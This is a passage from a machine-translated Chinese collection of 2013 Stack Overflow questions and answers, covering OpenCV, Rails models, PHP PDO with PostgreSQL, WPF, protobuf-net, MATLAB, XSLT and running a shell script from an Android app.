使用“www.google.com”运行相同的代码可以工作，我需要帮助来解决这个问题。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-15T12:48:22.810

其实，你的`driver.getCurrentUrl()`回报，`http://192.160.11.2:8081/` 但这个IP是jboss服务器的“欢迎页面”。所以我除了一些 html 标签你什么都找不到。

# opencv - 使用 Opencv 从相机获取部分图像

> ID：15879395
> 
> 赞同：0
> 
> 时间：2013-04-08T12:45:21.543
> 
> 标签：opencv, camera

我想从相机中获取部分图像。我有这个代码。这段代码在相机上给了我矩形。我需要获取矩形包含图像。

```
 for(int i=0;i<(detectRect_face ? detectRect_face->total:0); i++ )
    {
        CvRect* r = (CvRect*)cvGetSeqElem(detectRect_face, i); 
        CvPoint pt1 = { r->x+20, r->y+20 }; 
        CvPoint pt2 = { r->x + r->width-20, r->y + r->height-10 }; 
        cvRectangle(frame, pt1, pt2, CV_RGB(255,0,0), 1,8, 0); 

         //I need to write here a method to get this rectangle include image.
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-09T02:17:31.357

您可以使用 cvSetImageROI 和 cvCopy 方法来裁剪图像。

```
IplImage *dst = // Prepare partition size image.
cvSetImageROI(frame, r);
cvCopy(frame, dst);
cvResetImageROI(frame); 
```

# ruby-on-rails - 模型人员（用户）个人资料属性/属性 - 最佳实践，静态与动态属性

> ID：15879398
> 
> 赞同：0
> 
> 时间：2013-04-08T12:45:24.270
> 
> 标签：ruby-on-rails, model

我无法轻易找到关于 SO 的相关主题，所以我们开始了 - 一个经典问题：我有一个用户或个人模型，我想为那个人的物理属性/属性（眼睛颜色、头发颜色、肤色、性别、一些生活方式属性，例如每晚的睡眠时间（<8h、~8h、>8h）、吸烟、每天晒太阳等。

我通常通过为每个属性创建一个单独的 rails 模型（数据库表）来解决这个问题，因为以后很容易添加更多选项，编辑它们，用作源`<select>`，即

```
class Person
  belongs_to :eye_color
  belongs_to :skin_color
  belongs_to :hair_color
  belongs_to :sleep_per_night
  belongs_to :sun_exposure

  attr_accessible :gender # boolean, m/f
end

class HairColor
  has_many :people

  attr_accessible :value
end

class EyeColor
  has_many :people

  attr_accessible :value
end

Person.last.eye_color
...
EyeColor.first.people 
```

但是，如果有很多这些属性（即 10-15 种不同的物理和生活方式属性）怎么办。对我来说，这似乎打破了 DRY 规则，也就是说，我留下了许多小表，比如`eye_colors`3-5 条记录。这些表中的每一个只有一个有意义的列 - 值。

我在想你们如何解决这些问题，也许是通过创建一个模型，即具有以下结构的 PersonProperty

```
person_properties[type, value] 
```

因此先前具有单独模型的解决方案，即 eye_color 和 hair_color 看起来像这样（类型/类和值）：

```
# PersonProperty/person_properties:
1\. type: 'HairColor', value: 'red'
2\. type: 'HairColor', value: 'blond'
3\. type: 'SkinColor', value: 'white'
4\. type: 'EyeColor', value: 'green'
5\. type: 'HairColor', value: 'black'
6\. type: 'SkinColor', value: 'yellow'
7\. type: 'SleepPerNight', value: 'less than 8h'
8\. type: 'SleepPerNight', value: 'more than 8h'
9\. type: 'DailySunExposure', value: 'more than 1h'
...
19\. type: 'EyeColor', value: 'blue'
... 
```

通过将 PersonProperty 模型一分为二，上述示例可能会更加规范化。或者，也许你建议别的东西？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-08T14:15:54.767

在这种情况下，我不建议使用 has_one 关系。一个 User 可以`belongs_to :eye_color`，因此您可以在您的用户之间映射眼睛颜色。一个 EyeColor `has_many :users`，以便您可以`@eye_color.users`使用特定的 EyeColor 执行并获取所有用户。否则，您将不得不为每个用户（或者至少是有眼睛的用户）创建一个 EyeColor。

我建议在您的 PersonProperty 解决方案上这样做的原因是因为它更易于维护，并且因为将这些类型的关系委托给您的数据库可以提高性能。

**更新：**如果动态属性是你想要的，我建议你像这样设置你的模型：

```
class Person < ActiveRecord::Base
  has_many :person_attributes

  attr_accessible :gender
  accepts_nested_attributes_for :person_attributes
end

class PersonAttribute < ActiveRecord::Base
  belongs_to :person_attribute_type
  belongs_to :person_attribute_value
  belongs_to :person

  attr_accessible :person_id, :person_attribute_value_id
end

class PersonAttributeValue < ActiveRecord::Base
  has_many :person_attributes
  belongs_to :person_attribute_type

  attr_accessible :value, :person_attribute_type_id
end

class PersonAttributeType < ActiveRecord::Base
  has_many :person_attribute_values

  attr_accessible :name, :type
end 
```

这样，您可以执行以下操作：

```
@person_attribute_type = PersonAttributeType.create(:name => 'Eye color', :type => 'string')

['green', 'blue', 'brown'].each do |color|
  @person_attribute_type.person_attribute.values.build(:value => color)
end

@person_attribute_type.save

@person = Person.new
@person_attribute = @person.person_attributes.build
@person_attribute.person_attribute_value = @person_attribute_type.person_attribute_values.find(:value => 'green') 
```

当然，您可能不会通过命令行填充数据库。您可能会很好奇这将如何以一种形式工作：

```
class PersonController
  # ...
  def new
    @person = Person.new
    PersonAttributeType.all.each do |type|
      @person.person_attributes.build(:person_attribute_type = type)
    end
  end

  def create
    @person = Person.new(params[:person])
    if @person.save
      # ...
    else
      # ...
    end
  end

  def edit
    @person = Person.find(params[:id])
    PersonAttributeType.where('id NOT IN (?)', @person.person_attributes.map(&:person_attribute_type_id)).each do |type|
      @person.person_attributes.build(:person_attribute_type = type)
    end
  end
  # ... 
```

*现在的表格，基于 Formtastic：*

```
semantic_form_for @person do |f|
  f.input :gender, :as => :select, :collection => ['Male', 'Female']
  f.semantic_fields_for :person_attributes do |paf|
    f.input :person_attribute_value, :as => :select, :collection => paf.object.person_attribute_type.person_attributes_values, :label => paf.object.person_attribute_type.name
  end
  f.buttons
end 
```

请注意，这一切都未经测试，因此请尝试了解我在这里要做什么。

*顺便说一句，我现在意识到类名 Person* **Attribute** *可能有点不走运，因为你必须这样做`accepts_nested_attributes_for :person_attributes`意味着你必须这样做`attr_accessible :person_attributes_attributes`，但我希望你明白我的意思。*

# php - PHP PDO（PostgreSQL）：无法使多个参数工作

> ID：15879399
> 
> 赞同：3
> 
> 时间：2013-04-08T12:45:32.507
> 
> 标签：php, postgresql, pdo, prepared-statement

我有以下内容，但我无法让它工作：

```
$pdo = new \PDO('pgsql:host=xxxx;port=xxx;dbname=xxx;user=xxx;password=xxx');

$foo = 123;
$bar = 123;

$query = '
SELECT *, 
(
    SELECT allow
    FROM foo 
    WHERE foo_field = ?
    AND lorem.lorem_id = foo.lorem_id
) as foo_allowed, (
    SELECT allow
    FROM bar
    WHERE bar_id = ?
    AND lorem.lorem_id = bar.lorem_id
) as bar_allowed
FROM lorem';

$stmt = $pdo->prepare($query);
$stmt->bindValue(1, $foo);
$stmt->bindValue(2, $bar);
$stmt->execute();

var_dump($stmt->fetchAll()); 
```

上面的代码给了我以下错误：

> **消息**：执行“（查询）”时发生异常：SQLSTATE [08P01]：<>：7 错误：绑定消息提供 2 个参数，但准备好的语句“”需要 1 个

我在mysql中尝试了同样的方法，效果很好。我也尝试过命名参数，但这也不起作用。

使用 PHP 5.4.6 和 PostgreSQL 9.1.7。

@Kovge 我有用户、角色和资源。用户可以拥有资源，角色可以拥有资源。一个用户只有一个角色。在表 user_resource 中有一个字段表示是否允许用户访问资源。角色也是一样。我想要一个包含所有资源的表（HTML 表），并查看是否允许用户访问资源（首先通过 user_resource，然后是 role_resource）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-10-09T11:19:43.417

您是否尝试过不绑定直接调用执行。

```
$stmt = $pdo->prepare($query);
$stmt->execute(array( 1 => $foo, 2 => $bar)); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-09T16:06:01.967

你能用表连接代替吗？所以你的查询变成了这样：

```
SELECT l.*,
       f.allow,
       b.allow
  FROM foo_allowed f INNER JOIN
       lorem l ON ( l.lorem_id = f.lorem_id ) INNER JOIN       
       bar_allowed b ON ( l.lorem_id = b.lorem_id )       
 WHERE f.foo_field = ?
   AND b.bar_field = ? 
```

我没有对此进行测试，因此语法可能是错误的。

# web-services - 从 SSIS 调用 Web 服务

> ID：15879401
> 
> 赞同：1
> 
> 时间：2013-04-08T12:45:34.507
> 
> 标签：web-services, web, ssis

我正在尝试从 SSIS 包调用 Web 服务，出现以下错误

代码：0xC002F304 描述：发生错误并显示以下错误消息：“Microsoft.SqlServer.Dts.Tasks.WebServiceTask.WebserviceTaskException：无法读取 Web 服务描述语言 (WSDL) 文件。输入的 WSDL 文件无效。以下读取文件时出错。在 Microsoft.SqlServer.Dts 的 Microsoft.SqlServer.Dts.Tasks.WebServiceTask.WebServiceTaskUtil..ctor(Object connection, String updatedWSDL) 处的 XML 文档 (0, 0).. 中存在错误。 Tasks.WebServiceTask.WebServiceTask.executeThr

有人可以帮忙吗

当我部署到生产服务器时，我是否有必要将 WSDL 文件与包一起发送，或者它是否会自动下载

# wpf - WPF TabControl - 在选项卡加载之前需要默认消息

> ID：15879402
> 
> 赞同：0
> 
> 时间：2013-04-08T12:45:35.497
> 
> 标签：wpf, xaml, tabs, wpf-controls

我有一个 WPF TabControl，它的 TabItems 在运行时是 MEF。However, they are MEF'd in only when a certain item in a left-hand treeview is selected. 我想做的是在 TabControl 内显示一条居中的消息，指示“未选择活动方案”。我尝试在 TabControl 中添加一个 TextBlock，但我得到的是一个 TabItem。有任何想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-08T13:13:01.623

一种方法是简单地将 a`TextBlock`放在顶部并在未添加任何选项卡`TabControl`时显示它。`TabControl`

您可以将 的 绑定`Visibility`到`TextBlock`的`HasItems`属性`TabControl`并使用值转换器（[BooleanToVisibilityConverter](http://msdn.microsoft.com/en-us/library/ms609059%28v=vs.100%29.aspx)或您自己的实现）来显示和隐藏`TextBlock`.

# extjs - 如何在 sencha 中设置 Ext.Msg.show 的位置

> ID：15879410
> 
> 赞同：1
> 
> 时间：2013-04-08T12:45:47.480
> 
> 标签：extjs, sencha-touch, sencha-touch-2

如何在 senchatouch 中为 Ext.Msg.show 设置不同的位置。我尝试过使用这些方法

```
msg.getDialog().getPositionEl().setTop(50); 
```

&

```
msg.getDialog().setPosition(undefined,50) 
```

但是我收到一个错误`Object [object Object] has no method 'getPositionEl'`或`Object [object Object] has no method 'getDialog'`.

我什至在 sencha 的 MessageBox.js 文件中检查了这些方法，但它们不存在。

然而，几乎网上的解决方案似乎都推荐这些方法。专家您能否建议。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-08T17:30:48.923

`left`您可以通过指定和`top`配置选项将消息框放置到特定位置。

```
launch: function() {
    var msg = Ext.Msg.show({
            title:'Some title',
            message:'Sample message container.',
            left:50, // mention initial positioning with left and top config.
            top:50,
            buttons:[{  //create as many buttons you want. 
                text:'Ok',
                ui:'action',
                handler:function(btn){
                    if(msg.getTop() == 200) // Just for demo. Click Ok and place msg box to some other position. If clicked again, hide message box
                        msg.hide();
                    else{
                        msg.setTop(200); 
                        msg.setLeft(200);
                    }
                }
            }]
    });
} 
```

除了配置选项，您还可以将消息框与`setTop()`和`setLeft()`方法对齐。

请参阅[演示](http://www.senchafiddle.com/#A2pAR)。如您所见，消息框没有放置在中心，因为它的默认位置是中心，而是放置在顶部和左侧设置为 50。

# c# - C# protobuf-net 序列化对象到 java

> ID：15879413
> 
> 赞同：1
> 
> 时间：2013-04-08T12:45:56.343
> 
> 标签：c#, java, serialization, protocol-buffers, protobuf-net

所以我有一个小问题：

使用 MQTT 发送消息，它由一系列使用 C# 中的 protobuf-net 序列化的对象组成（**我无法修改此代码**，但我可以访问源代码）。在另一端，我收到了 Java 中的序列化对象，问题是我似乎无法使用 protobuf 反序列化对象，如果有人遇到过这个问题并解决了它，请帮助 :)

C# 中的对象示例：

```
using ProtoBuf;

namespace Concentrator.Services
{
[ProtoContract]
public class MeterID
{
    private byte[] _id;

    [ProtoMember(1)]
    public byte[] ID
    {
        get { return _id; }
        set { _id = value.Length == 16 ? value : null; }
    }

    [ProtoMember(2)] public string MeterType;
}
} 
```

我尝试在 Java 中重新创建相同的对象（.proto 文件）：

```
syntax = "proto2";

 package mqtt.entity;

 option java_package = "mqtt.entity";
 option java_outer_classname = "ProtoMeter";
 message Meter {
    optional bytes ID = 1;
     optional string MeterType = 2;
  }

  message MeterID {
     repeated Meter mid = 1;
 } 
```

这个例子的解决方案将是一个巨大的帮助，非常感谢。

在 C# 中反序列化对象的代码：

```
var ms = new MemoryStream(data, 7, data.Length - 9)
var res = Serializer.Deserialize<List<MeterID>>(ms); 
```

这在 C# 中有效，我正在尝试在 java 中实现相同的目标

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-08T12:50:26.577

您的 C# 代码中的消息仅匹配：

```
message MeterID {
    optional bytes ID = 1;
    optional string MeterType = 2;
} 
```

不需要 2 级模型（除非您`*WithLengthPrefix`在 C# 代码中使用）。您还可以使用以下方法获取该输出：

```
var proto = Serializer.GetProto<MeterID>(); 
```

* * *

通过您的编辑， a`List<MeterID>`可以映射为

```
message List_MeterID {
    repeated MeterID items = 1;
} 
```

与前一个片段*结合使用*。`MeterID`这就是你的问题。所以归结为“目前发生了什么？”。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-08T12:50:04.683

尝试通过重新生成原始文件`GetProto<T>`

# matlab - MATLAB 中的 Normplot 颜色图

> ID：15879418
> 
> 赞同：3
> 
> 时间：2013-04-08T12:46:06.740
> 
> 标签：matlab, plot, color-mapping

我有一组 m 矩阵形状的向量，我想从中计算叠加的 m 个范数图。这很简单：

```
c=rand(100,10);
figure
normplot(c) 
```

normplot 会自动为每列数据着色，但我想控制它们的着色方式。具体来说，我需要使它们成为灰度。第一组数据（第 1 列）应为白色（或接近白色），最后一组数据为黑色。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-08T13:36:21.053

通过获取绘制线的句柄，您可以像这样：

```
close all;
n = 100;
m = 10;
doc=rand(n,m);
figure;

% obtain the handle h to the dotted lines
h = normplot(doc);

% define colormap
g = colormap('gray');

for i = 1:m
    %set(h([1 11 21]),'color','r') % to set color to red
    %set(h([1 11 21]),'marker','o') % to change marker

    % mapping into greyscale color map (g has size 64x3)
    set(h([i i+m i+2*m]),'color',g(round(i * size(g,1)/m),:));
end 
```

![在此处输入图像描述](https://i.stack.imgur.com/eTZQ4.png)

# ruby-on-rails - 外键不更新

> ID：15879419
> 
> 赞同：0
> 
> 时间：2013-04-08T12:46:11.183
> 
> 标签：ruby-on-rails, ruby-on-rails-3, nested-attributes, has-many, polymorphic-associations

我正在为大学开发一个应用程序，用户可以在其中登录并上传远足径的详细信息。

到目前为止，一切正常，我还为每条远足小径的照片实施了嵌套表格。用户可以登录并创建徒步旅行。

我想显示用户在显示/个人资料页面中创建的所有远足，但是当我在我的数据库中设置了关系并在我的模型中设置了`has_many`&`belongs_to`选项时。我也尝试过使用嵌套来做到这一点，`accepts_nested_attributes_for :hikingtrails`但这些都不起作用。

当用户创建远足路径时，我检查了我的数据库，它没有更新表中的 user_id 字段。

我不确定我是否以完全错误的方式接近这个问题，我应该查看多态关联吗？

```
class User < ActiveRecord::Base
  attr_accessible :user_name, :email, :password, :password_confirmation, :photos_attributes,  :hikingtrails_attributes

  has_many :hikingtrails
  accepts_nested_attributes_for :hikingtrails, :allow_destroy => :true, :reject_if => :all_blank

class Hikingtrail < ActiveRecord::Base
  attr_accessible :description,  :name, :looped, :photos_attributes,:directions_attributes, :user_id

    has_many :photos
    has_many :trails
    has_many :directions
    belongs_to :user 
```

**用户/show.html.erb**

```
<div class="page-header">
  <h1>Your Profile</h1>
</div>

<p>
  <b>username:</b>
  <%= @user.user_name %>
</p>

<p>
  <b>email:</b>
  <%= @user.email %>
</p>

<h4>Small Photos</h4>
<% @user.photos.each do |photo| %>
<%= image_tag photo.image_url(:thumb).to_s %>
<% end %>

<h4>Hiking Trails</h4>
<% @user.hikingtrails.each do |hk| %>
<%= hk.name %>
<% end %>

<%= link_to "Edit your Profile", edit_user_path(current_user), :class => 'btn btn-mini' %> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-08T12:55:54.057

您没有`:user_id`在 Hikingtrail 模型中添加可访问属性。尝试以下操作：

```
attr_accessible :description, 
                                  :duration_hours, 
                                  :duration_mins, 
                                  :name, 
                                  :looped,
                                  :addr_1,
                                  :addr_2,
                                  :addr_3,
                                  :country,
                                  :latitude,
                                  :longitude,
                                  :photos_attributes,
                                  :trails_attributes,
                                  :directions_attributes,
                                  :user_id 
```

**更新**：看到表单代码后，我认为可能没有必要执行上述操作，并且也可能不安全。相反，不要通过批量分配设置 user_id，而是在控制器中处理用户分配，如下所示：

```
class HikingtrailsController < ApplicationController
  # ...
  def create
    @hikingtrail = Hikingtrail.new(params[:hikingtrail])
    @hikingtrail.user = current_user
    if @hikingtrail.save
      # ...
    else
      # ...
    end
  end
end 
```

希望这可以帮助 ：）

# vb.net - 在 2 个数据视图之间来回拖放复制操作

> ID：15879427
> 
> 赞同：1
> 
> 时间：2013-04-08T12:46:25.277
> 
> 标签：vb.net, drag-and-drop

我正在尝试以相同的形式在两个数据网格视图之间实现拖放。我有 DataGridView1 和 DataGridView2，数据源绑定到 SQL Server 视图。和以下代码：

```
 Private Sub DataGridView1_MouseDown(ByVal sender As System.Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles DataGridView1.MouseDown
        Dim Index As Integer
        Index = DataGridView1.HitTest(e.X, e.Y).RowIndex
        If Index > -1 Then
            'Pass the Index as "Data" argument of the DoDragDrop Function
            Me.DataGridView1.Rows(Index).Selected = True
            DataGridView1.DoDragDrop(Index, DragDropEffects.Move)
        End If
 End Sub

Private Sub DataGridView2_MouseDown(ByVal sender As System.Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles DataGridView2.MouseDown
    Dim Index As Integer
    Index = DataGridView2.HitTest(e.X, e.Y).RowIndex
    If Index > -1 Then
        'Pass the Index as "Data" argument of the DoDragDrop Function
        Me.DataGridView2.Rows(Index).Selected = True
        DataGridView1.DoDragDrop(Index, DragDropEffects.Move)
    End If
End Sub

Private Sub DataGridView1_DragDrop(ByVal sender As System.Object, ByVal e As System.Windows.Forms.DragEventArgs) Handles DataGridView1.DragDrop
    Try
        Dim myID As Integer = Convert.ToInt32(e.Data.GetData(Type.GetType("System.Int32")))

        (...
         code to execute query to add selected value to a table
         ...) 

    Catch ex As Exception
        MsgBox(ex.Message)
    End Try
End Sub

Private Sub DataGridView2_DragDrop(ByVal sender As System.Object, ByVal e As System.Windows.Forms.DragEventArgs) Handles DataGridView2.DragDrop
    Try
        Dim myID As Integer = Convert.ToInt32(e.Data.GetData(Type.GetType("System.Int32")))

        (...
         code to execute query to delete selected value from a table
         ...)    
    Catch ex As Exception
        MsgBox(ex.Message)
    End Try
End Sub 
```

一切几乎都按计划进行：
如果我将记录从第一个数据网格移动到第二个数据网格并放下它，所有代码都可以正常工作，记录通过 SQL 移动到第二个数据网格视图，但是，如果我点击第二个数据网格视图，拖动事件再次触发，就像从第二个数据网格拖动到第一个数据网格一样。我怎样才能防止这种行为。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-29T13:31:12.390

在您的 _MouseDown 方法中，在***第二个*****方法中，您在 DataGridView* 1***上执行 DoDragDrop() ，您忘记更改它：

```
 Me.DataGridView***2***.Rows(Index).Selected = True
 DataGridView***1***.DoDragDrop(Index, DragDropEffects.Move)DataGridView1.DoDragDrop(Index, DragDropEffects.Move) 
```

编辑：请注意，复制这样的代码是一种非常糟糕的做法。我要做的是制作一种将 DataGridView 作为参数的方法，并在 2 个相同的方法中使用相应的对象调用这个方法。然后，您只需设计、调试和维护一段代码。

# ruby-on-rails - Rails 架构，更好地创建一个新模型还是为现有模型添加一个布尔值？

> ID：15879430
> 
> 赞同：0
> 
> 时间：2013-04-08T12:46:44.727
> 
> 标签：ruby-on-rails, ruby-on-rails-3, model

我有一篇文章模型 article.rb （带有相关图片）：

attr_accessible :name, :content, :image_ids, :altname1

我现在想创作另一种只针对城市的文章。它们将出现在网站的一个完全不同的部分，并且与所有其他文章无关。但是模型完全一样。

是创建一个新模型 cityarticle.rb 更好，还是在现有文章模型中添加一个新的布尔列（cityarticle 具有 true 和 false 作为选项）更好。然后我会向控制器添加一个新动作：

```
def cityarticles
  @cityarticles = Article.where("cityarticle = ?", true)
end 
```

对我来说，只保留一个模型更容易，但新模型可能有充分的理由吗？性能怎么样？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-08T12:49:31.747

新模型代表系统上的新“实体”。

> 说 CityArticles 扩展文章

它应该是一个新的模型，用于代码清晰度和可扩展性，以增加“CityArticles”的功能。

您可以制作新的表格脚手架或迁移：

> rails g 脚手架城市文章参考：文章

或制作文章类polimorfic 协会。阅读[http://teachmetocode.com/articles/ruby-on-rails-what-are-polymorphic-associations/](http://teachmetocode.com/articles/ruby-on-rails-what-are-polymorphic-associations/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-08T13:35:49.170

要问自己一些问题：这些类型的文章在哪些其他方面会有所不同？不同的人是否有权创建/编辑/删除它们？如何创建城市文章而不让它意外保存为非城市文章，反之亦然？我是否使用 attr_accessible 或 strong_parameters 来防止用户使用传入的参数覆盖文章类型？不同类型是否会有不同的验证规则（可能需要城市文章的城市名称）？只获得我想要的文章有多难？我有多大可能忘记指定要显示和显示所有文章的类型？

根据对这些问题的回答，您应该能够决定哪种数据结构最适合您。如果您使用 Rails 的 STI 模式，作为一种解决方案，您可以使用一张桌子但有两种不同的模型。性能可能不是主要考虑因素，但如果这两种类型的文章永远不会一起查询，那么将它们分成单独的表在性能方面可能会稍微好一些。

# javascript - 从 Dojo 转换为 jQuery

> ID：15879431
> 
> 赞同：0
> 
> 时间：2013-04-08T12:46:53.367
> 
> 标签：javascript, jquery, mobile, dojo, ibm-mobilefirst

如何将此函数转换为 jQuery ？

```
function (parser, connect) {
    dojo.ready(function() {
        parser.parse();
        dojo.style("content", "display", "");
        connect.connect(dijit.byId("myAccountsListItem"), "onClick",
                null, getAccounts);
    });
}); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-08T12:51:39.833

这应该做

```
$(function(){
    $('#content').css("display", "");

    $('#myAccountsListItem').on('click', getAccounts);
}) 
```

# asp.net-mvc-3 - 从控制器调用 Windows 服务

> ID：15879435
> 
> 赞同：0
> 
> 时间：2013-04-08T12:47:00.370
> 
> 标签：asp.net-mvc-3, windows-services, msmq

我创建并安装了一个 Windows 服务。我想从我的 MVC 控制器调用它，因为我正在实现 MSMQ 消息传递服务，所以需要调用 Windows 服务。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T12:49:45.437

~~理想情况下，Windows 服务应该托管您的 Web 应用程序可以联系的 WCF 服务。从那里开始，创建一个客户端、进行 WCF 调用（对服务）和发送/接收必要的信息。~~

抱歉，直到后来才看到[MSMQ 。](http://msdn.microsoft.com/en-us/library/ms978430.aspx)怎么样：

```
MessageQueueTransaction msgTx = new MessageQueueTransaction();
MessageQueue msgQ = new MessageQueue(@".\private$\Orders");
msgTx.Begin();
try
{
   msgQ.Send("First Message",msgTx);
   msgQ.Send("Second Message",msgTx);
   msgTx.Commit();
}
catch
{
   msgTx.Abort();
}
finally
{
   msgQ.Close();
} 
```

然后，当然，有一种读取服务中消息的方法。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-01-13T21:38:48.730

有一个 .net 库可以作为推送通知执行此操作，它的名称是 signalr

# iphone - 如果我在 ipa 文件的点击事件中在浏览器中打开网站 url，是否可以在 istore 中上传 ipa 文件

> ID：15879438
> 
> 赞同：-1
> 
> 时间：2013-04-08T12:47:10.113
> 
> 标签：iphone, ios, cordova, app-store-connect, itunes-store

我使用 .ipa 创建了一个 .ipa 文件`PhoneGap`。

当用户单击我的应用程序图标时，它将在网络浏览器中将用户重定向到我的网站。

AppStore 会批准这个 App 的 ind 吗？

**另一个疑问：** 另外，如果我在我的应用程序中使用 WebKit 组件来显示应用程序内部的网站；苹果会批准这种 App 吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-09T07:46:46.397

仔细阅读此[AppStore 审查指南](https://developer.apple.com/appstore/resources/approval/guidelines.html#functionality)：

它说：

![在此处输入图像描述](https://i.stack.imgur.com/jE6Uq.png)

和

![在此处输入图像描述](https://i.stack.imgur.com/nPizC.png)

希望这能消除您的疑虑。

因此，如果您除了在 Web 视图中显示网站或提供指向您网站的外部链接外，**没有**做**任何有用**和**有趣的事情；**那么你应该准备好被**拒绝**了。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-08T12:53:14.357

根据 Apple Review 指南，只有在 iOS 应用程序中嵌入`UIWebView`或重定向到网站且无用的应用程序的网站才会被拒绝。

# c# - 将 xml 文件转换为其他 xml 格式

> ID：15879443
> 
> 赞同：-2
> 
> 时间：2013-04-08T12:47:22.283
> 
> 标签：c#, xml, xslt

我有一个关于转换 xml 文件的问题。我有一个 xml 文件 (xml1)，它具有以下结构：

```
<Info>
  <cars>
   <car>
       <id>1</id>
       <brand>Pegeout</brand>
    </car>
    <car>
       <id>2</id>
       <brand>Volkwagen</brand>
    </car>
  </cars>
  <distances>
    <distance>
      <id_car>1</id_car>
      <distance_km>111</distance_km>
    </distance>
    <distance>
        <id_car>1</id_car>
        <distance_km>23</distance_km>
    </distance>
  </distances>
</Info> 
```

我不明白我可以使用 xslt 将一个 xml 转换为另一个。如何生成 xsl 样式表？存在 C# 中的设计器吗？

有人可以告诉我如何使用 C# 中的 XSL 样式表将此 xml 文件格式转换为这种格式（xml2）：

```
<Info>
  <cars>
   <car>
       <id>1</id>
       <brand>Pegeout</brand>
       <distance>
          <distance_km>111</distance_km>
          <distance_km>23</distance_km>
       </distance>
   </car>
    <car>
       <id>2</id>
       <brand>Volkwagen</brand>
    </car>
  </cars>
</Info> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T13:58:11.567

定义一个键来通过 id 引用元素：

```
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">

<xsl:output indent="yes"/>
<xsl:strip-space elements="*"/>

<xsl:key name="id" match="distance" use="id_car"/>

<xsl:template match="@* | node()">
  <xsl:copy>
    <xsl:apply-templates select="@* | node()"/>
  </xsl:copy>
</xsl:template>

<xsl:template match="car">
  <xsl:copy>
    <xsl:apply-templates select="@* | node()"/>
    <xsl:variable name="ref-dist" select="key('id', id)/distance_km"/>
    <xsl:if test="$ref-dist">
      <distance>
        <xsl:apply-templates select="$ref-dist"/>
      </distance>
    </xsl:if>
  </xsl:copy>
</xsl:template>

<xsl:template match="Info/distances"/>

</xsl:stylesheet> 
```

# android - 使用 android 应用程序运行脚本

> ID：15879452
> 
> 赞同：7
> 
> 时间：2013-04-08T12:47:46.283
> 
> 标签：android, bash, shell, button

我有这个 shell 脚本：

```
#!system/bin/sh
while :
do
sync
echo 3> /proc/sys/vm/drop_caches
echo "Script is been launched"
sleep 30m
done
exit 0; 
```

我希望使用 android 应用程序运行此脚本。我现在已经创建了一个只有吐司的按钮。我如何获取脚本（free.sh）并使用应用程序上的按钮启动它？或者有没有用java重写代码的解决方案？谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-08T13:34:47.470

首先，您将使用 Eclipse 创建一个简单的 Android helloworld 应用程序。并在您的布局中添加一个按钮。[这是非常初级的 Android 开发实践，您可以从http://d.android.com](http://d.android.com)了解更多信息

请在按钮的 onclick 回调函数中尝试此代码：

```
Button b = (Button)findViewById(R.id.buttonPower);
        b.setOnClickListener(new OnClickListener() {
            @Override
            public void onClick(View arg0) {
                Process p=null;
                try {
                    p = new ProcessBuilder()
                    .command("PathToYourScript")
                    .start();
                } catch (IOException e) {
                    e.printStackTrace();
                } finally {
                    if(p!=null) p.destroy();
                }
            }
        }); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2017-01-11T07:45:43.033

以下是如何从您的 android 应用程序运行 shell 脚本

```
try {
            Process process = Runtime.getRuntime().exec("sh /sdcard/test.sh");
            BufferedReader in = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String listOfFiles = "";
            String line;
            while ((line = in.readLine()) != null) {
                listOfFiles += line;
            }
        }
        catch (IOException e) {
            e.printStackTrace();
        } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-08T17:42:12.537

我的代码中有错误：

```
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.Toast;

import com.example.toast.R;

public class MainActivity extends Activity {

    private Button button;

    public void onCreate(Bundle savedInstanceState) {

        super.onCreate(savedInstanceState);
        setContentView(R.layout.tab1);

        button = (Button) findViewById(R.id.button1);

        button.setOnClickListener(new OnClickListener() {

            @Override
            public void onClick(View arg0) {
                Process process = new ProcessBuilder()
                .command("PATH")
                .redirectErrorStream(true)
                .start();
                try {
                    InputStream in = process.getInputStream();
                    OutputStream out = process.getOutputStream();
                    readStream(in);// Here: Syntax error, insert "}" to complete `Block`

                finally {
                    process.destroy();
                }
            }
        }
        }); //Here: Syntax error on token "}", delete this token
    }

    protected void readStream(InputStream in) {
        // TODO Auto-generated method stub
    }
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-09T15:40:03.573

好吧，现在没有错误（谢谢！），但什么也不做……尝试我编写了一个简单的脚本来编写 file.txt。见代码：

```
package com.mkyong.android;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.Toast;  
import java.io.IOException;

import com.example.toast.R;

public class MainActivity extends Activity {

private Button button;

public void onCreate(Bundle savedInstanceState) {

    super.onCreate(savedInstanceState);
    setContentView(R.layout.tab1);

    button = (Button) findViewById(R.id.button1);
    button.setOnClickListener(new OnClickListener() {
        @SuppressLint("SdCardPath")
        @Override
